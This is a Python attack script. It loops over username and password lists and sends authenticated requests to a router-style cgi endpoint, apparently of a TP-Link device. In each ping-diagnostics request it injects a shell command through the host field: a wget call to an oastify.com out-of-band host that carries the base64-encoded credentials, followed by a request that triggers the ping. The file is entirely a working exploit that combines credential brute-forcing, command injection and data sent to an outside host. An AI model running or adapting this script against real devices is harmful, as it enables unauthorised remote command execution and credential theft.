import requests
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def send1(username, password):
	auth = "{}:{}".format(username, password)
	auth_b64 = base64.b64encode(auth.encode('ascii'))
	headers = {
		"Cookie": "Authorization=Basic {}".format(auth_b64.decode('ascii')),
		"Referer": "http://dev1611.slack.com/mainFrame.htm",
		"Content-Type": "text/plain",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"}

	proxy = {
	        "http": "http://127.0.0.1:8080",
	        "https": "http://127.0.0.1:8080"
	    }
	url = 'https://dev1611.slack.com/cgi?2'
	text = "[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\ndataBlockSize=64\r\ntimeout=1\r\nnumberOfRepetitions=4\r\nhost=$(echo 127.0.0.1; wget http://{}.g8pk6v20me9jflfgw9jxdrcquh08o0cp.oastify.com)\r\nX_TP_ConnName=ewan_ipoe_d\r\ndiagnosticsState=Requested".format(auth_b64.decode('ascii').replace("=",""))
	x = requests.post(url, data=text, headers=headers, verify=False, allow_redirects=False)
	print(x.status_code)

def send2(username, password):
	auth = "{}:{}".format(username, password)
	auth_b64 = base64.b64encode(auth.encode('ascii'))
	headers = {
		"Cookie": "Authorization=Basic {}".format(auth_b64.decode('ascii')),
		"Referer": "http://dev1611.slack.com/mainFrame.htm",
		"Content-Type": "text/plain",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"}

	proxy = {
	        "http": "http://127.0.0.1:8080",
	        "https": "http://127.0.0.1:8080"
	    }
	url = 'https://dev1611.slack.com/cgi?7'
	text = "[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0"
	x = requests.post(url, data=text, headers=headers, verify=False, allow_redirects=False)
	print(x.status_code)


with open('usernames.txt') as f:
	usernames = [line for line in f]

with open('passwords.txt') as f:
	passwords = [line for line in f]

for username in usernames:
	for password in passwords:
		send1(username.replace("\n", ""), password.replace("\n", ""))
		send2(username.replace("\n", ""), password.replace("\n", ""))
		print("{}: {}".format(username.replace("\n", ""), password.replace("\n", "")))
